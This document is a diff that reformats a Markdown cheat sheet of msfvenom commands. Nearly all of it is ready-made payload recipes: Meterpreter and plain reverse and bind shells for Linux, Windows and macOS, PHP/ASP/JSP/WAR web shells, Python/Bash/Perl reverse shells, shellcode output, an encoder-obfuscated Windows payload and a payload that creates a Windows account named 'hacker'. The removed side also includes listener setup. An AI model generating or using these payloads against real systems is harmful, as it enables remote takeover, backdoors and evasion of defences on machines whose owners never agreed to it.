@@ -1,84 +1,94 @@
-# Metasploit Reverse Shells
+# msfvenom Reverse Shells
 
-**List payloads**  
-msfvenom -l
+## **List payloads**
 
-**Binaries Payloads**
+* msfvenom -l
 
-**Linux Meterpreter Reverse Shell**  
-msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf
+## **Binaries Payloads**
 
-**Linux Bind Meterpreter Shell**  
-msfvenom -p linux/x86/meterpreter/bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; bind.elf
+**Linux Meterpreter Reverse Shell**
 
-**Linux Bind Shell**  
-msfvenom -p generic/shell\_bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; term.elf
+* msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf
 
-**Windows Meterpreter Reverse TCP Shell**  
-msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe
+**Linux Bind Meterpreter Shell**
 
-**Windows Reverse TCP Shell**  
-msfvenom -p windows/shell/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe
+* msfvenom -p linux/x86/meterpreter/bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; bind.elf
 
-**Windows Encoded Meterpreter Windows Reverse Shell**  
-msfvenom -p windows/meterpreter/reverse\_tcp -e shikata\_ga\_nai -i 3 -f exe &gt; encoded.exe
+**Linux Bind Shell**
 
-**Mac Reverse Shell**  
-msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; shell.macho
+* msfvenom -p generic/shell\_bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; term.elf
 
-**Mac Bind Shell**  
-msfvenom -p osx/x86/shell\_bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; bind.macho
+**Windows Meterpreter Reverse TCP Shell**
 
-**Web Payloads**
+* msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe
 
-**PHP Meterpreter Reverse TCP**  
-msfvenom -p php/meterpreter\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.php  
-cat shell.php \| pbcopy && echo ‘&lt;?php ‘ \| tr -d ‘\n’ &gt; shell.php && pbpaste &gt;&gt; shell.php
+**Windows Reverse TCP Shell**
 
-**ASP Meterpreter Reverse TCP**  
-msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f asp &gt; shell.asp
+* msfvenom -p windows/shell/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe
 
-**JSP Java Meterpreter Reverse TCP**  
-msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.jsp
+**Windows Encoded Meterpreter Windows Reverse Shell**
 
-**WAR**  
-msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f war &gt; shell.war
+* msfvenom -p windows/meterpreter/reverse\_tcp -e shikata\_ga\_nai -i 3 -f exe &gt; encoded.exe
 
-**Scripting Payloads  
+**Mac Reverse Shell**
+
+* msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; shell.macho
+
+**Mac Bind Shell**
+
+* msfvenom -p osx/x86/shell\_bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; bind.macho
+
+## **Web Payloads**
+
+**PHP Meterpreter Reverse TCP**
+
+* msfvenom -p php/meterpreter\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.php
+* cat shell.php \| pbcopy && echo ‘&lt;?php ‘ \| tr -d ‘\n’ &gt; shell.php && pbpaste &gt;&gt; shell.php
+
+**ASP Meterpreter Reverse TCP**
+
+* msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f asp &gt; shell.asp
+
+**JSP Java Meterpreter Reverse TCP**
+
+* msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.jsp
+
+**WAR**
+
+* msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f war &gt; shell.war
+
+## **Scripting Payloads**
+
   
-Python Reverse Shell**  
-msfvenom -p cmd/unix/reverse\_python LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.py
+**Python Reverse Shell**
 
-**Bash Unix Reverse Shell**  
-msfvenom -p cmd/unix/reverse\_bash LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.sh
+* msfvenom -p cmd/unix/reverse\_python LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.py
 
-**Perl Unix Reverse shell**  
-msfvenom -p cmd/unix/reverse\_perl LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.pl
+**Bash Unix Reverse Shell**
 
-**Shellcode**
+* msfvenom -p cmd/unix/reverse\_bash LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.sh
 
-Windows Meterpreter Reverse TCP Shellcode  
-msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
+**Perl Unix Reverse shell**
 
-**Linux Meterpreter Reverse TCP Shellcode**  
-msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
+* msfvenom -p cmd/unix/reverse\_perl LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.pl
 
-**Mac Reverse TCP Shellcode**  
-msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
+## **Shellcode**
 
-**Create User**  
-msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe
+**Windows Meterpreter Reverse TCP Shellcode**
 
-**Metasploit Handler**
+* msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
 
-use exploit/multi/handler  
-set PAYLOAD &lt;Payload name&gt;  
-Set RHOST &lt;Remote IP&gt;  
-set LHOST &lt;Local IP&gt;  
-set LPORT &lt;Local Port&gt;  
-Run
+**Linux Meterpreter Reverse TCP Shellcode**
 
+* msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
 
+**Mac Reverse TCP Shellcode**
+
+* msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
+
+**Create User**
+
+* msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe
 
 Ref: [https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)
 
